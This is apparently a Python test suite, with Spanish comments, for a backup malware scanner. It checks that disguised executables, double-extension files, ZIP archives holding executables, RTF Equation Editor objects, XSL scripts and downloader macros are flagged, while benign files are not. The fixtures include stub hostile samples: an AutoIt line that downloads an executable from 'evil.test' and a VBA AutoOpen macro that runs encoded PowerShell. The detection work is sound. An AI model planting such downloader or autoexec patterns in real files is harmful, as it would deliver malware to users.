"""Pruebas de ExecutableScanner: ejecutables disfrazados, macros descargadoras,
exploits RTF/PDF/ZIP y gating de alcance web/correo (evita FP en el resto del backup).
"""
import sys
import tempfile
import zipfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from src.scanners.executable_scanner import ExecutableScanner  # noqa: E402


class TestExecutableScanner(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="exetest_"))
        self.scanner = ExecutableScanner()

    def _write_bytes(self, relpath, data: bytes):
        p = self.tmp / relpath
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)
        return str(p)

    def _write_text(self, relpath, text: str):
        return self._write_bytes(relpath, text.encode("utf-8"))

    def test_exe_fuera_de_alcance_web_no_genera_hallazgos(self):
        # Un .exe en cualquier otra parte del backup (fuera de uploads/mail/web)
        # no debe marcarse: evita ruido sobre herramientas o backups legitimos.
        fp = self._write_bytes("homedir/tools/setup.exe", b"MZ" + b"\x00" * 100)
        self.assertEqual(self.scanner.scan(fp), [])

    def test_exe_en_uploads_wordpress_se_detecta(self):
        fp = self._write_bytes("public_html/wp-content/uploads/2026/EstadoCuenta.exe", b"MZ" + b"\x00" * 100)
        cats = [f.category for f in self.scanner.scan(fp)]
        self.assertIn("malicious_attachment", cats)

    def test_doble_extension_pdf_exe_se_detecta(self):
        fp = self._write_bytes("public_html/wp-content/uploads/comprobante.pdf.exe", b"MZ" + b"\x00" * 100)
        cats = [f.category for f in self.scanner.scan(fp)]
        self.assertIn("double_extension", cats)

    def test_ejecutable_disfrazado_de_tmp_por_cabecera_mz(self):
        fp = self._write_bytes("public_html/wp-content/uploads/archivo.tmp", b"MZ" + b"\x00" * 100)
        cats = [f.category for f in self.scanner.scan(fp)]
        self.assertIn("disguised_executable", cats)

    def test_dat_benigno_sin_cabecera_pe_no_se_marca(self):
        fp = self._write_bytes("public_html/wp-content/uploads/datos.dat", b"no es un ejecutable, solo datos")
        cats = [f.category for f in self.scanner.scan(fp)]
        self.assertNotIn("disguised_executable", cats)

    def test_au3_con_llamadas_de_descarga_se_marca_high(self):
        fp = self._write_text(
            "public_html/wp-content/uploads/pedido.au3",
            'Run("cmd.exe /c calc")\nInetGet("http://evil.test/x", @TempDir & "\\x.exe")\n',
        )
        findings = self.scanner.scan(fp)
        self.assertTrue(any(f.category == "suspicious_attachment" and f.severity == "high" for f in findings))

    def test_rtf_con_equation_editor_se_marca(self):
        fp = self._write_bytes(
            "public_html/wp-content/uploads/Documento.rtf",
            b"{\\rtf1\\ansi some object data Equation.3 more bytes here",
        )
        cats = [f.category for f in self.scanner.scan(fp)]
        self.assertIn("malicious_attachment", cats)

    def test_zip_con_ejecutable_embebido_se_detecta(self):
        fp = self.tmp / "public_html" / "wp-content" / "uploads" / "Adjunto.zip"
        fp.parent.mkdir(parents=True, exist_ok=True)
        with zipfile.ZipFile(fp, "w") as z:
            z.writestr("factura.exe", b"MZ" + b"\x00" * 50)
        cats = [f.category for f in self.scanner.scan(str(fp))]
        self.assertIn("malicious_attachment", cats)

    def test_zip_benigno_sin_ejecutables_no_se_marca(self):
        fp = self.tmp / "public_html" / "wp-content" / "uploads" / "fotos.zip"
        fp.parent.mkdir(parents=True, exist_ok=True)
        with zipfile.ZipFile(fp, "w") as z:
            z.writestr("foto1.jpg", b"\xff\xd8\xff" + b"\x00" * 50)
        self.assertEqual(self.scanner.scan(str(fp)), [])

    def test_docm_ooxml_con_macro_downloader_y_autoexec_es_critico(self):
        fp = self.tmp / "public_html" / "wp-content" / "uploads" / "Factura_2026.docm"
        fp.parent.mkdir(parents=True, exist_ok=True)
        with zipfile.ZipFile(fp, "w") as z:
            z.writestr("word/vbaProject.bin", b"Sub AutoOpen()\nShell(\"powershell -enc xxxx\")\nEnd Sub")
        findings = self.scanner.scan(str(fp))
        self.assertTrue(any(f.category == "malicious_attachment" and f.severity == "critical" for f in findings))

    def test_xml_con_msxsl_script_se_marca(self):
        fp = self._write_text(
            "public_html/wp-content/uploads/config.xml",
            '<?xml version="1.0"?><stylesheet xmlns:msxsl="urn:schemas-microsoft-com:xslt">'
            '<msxsl:script language="JScript">exec()</msxsl:script></stylesheet>',
        )
        cats = [f.category for f in self.scanner.scan(fp)]
        self.assertIn("malicious_attachment", cats)

    def test_xml_benigno_no_se_marca(self):
        fp = self._write_text(
            "public_html/wp-content/uploads/sitemap.xml",
            '<?xml version="1.0"?><urlset><url><loc>https://example.com/</loc></url></urlset>',
        )
        self.assertEqual(self.scanner.scan(fp), [])


if __name__ == "__main__":
    unittest.main()
